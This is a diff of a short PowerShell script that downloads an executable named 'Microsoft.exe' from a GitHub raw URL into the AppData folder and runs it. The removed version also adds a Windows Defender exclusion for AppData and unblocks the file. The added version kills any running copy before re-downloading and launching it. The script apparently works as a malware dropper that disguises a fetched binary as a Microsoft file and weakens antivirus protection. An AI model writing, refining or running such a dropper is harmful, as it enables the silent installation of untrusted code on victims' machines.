@@ -1,12 +1,15 @@
-$exePath = "$env:AppData\Microsoft.exe"
-$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe"
+$exePath = "$env:APPDATA\Microsoft.exe"
+$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe" # Make sure your URL is here
 
-# 1. Add Exclusion for AppData
-Add-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue
+# --- FIX: Kill the process if it is already running ---
+Stop-Process -Name "Microsoft" -Force -ErrorAction SilentlyContinue
 
-# 2. Download the EXE
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0" -ErrorAction SilentlyContinue
+# --- FIX: Wait a second for the file to unlock ---
+Start-Sleep -Seconds 1
 
-# 3. Unblock and Run
-Unblock-File $exePath
-Start-Process $exePath
+try {
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
+    Start-Process $exePath
+} catch {
+    Write-Host "Could not download file. Make sure the URL is correct." -ForegroundColor Red
+}
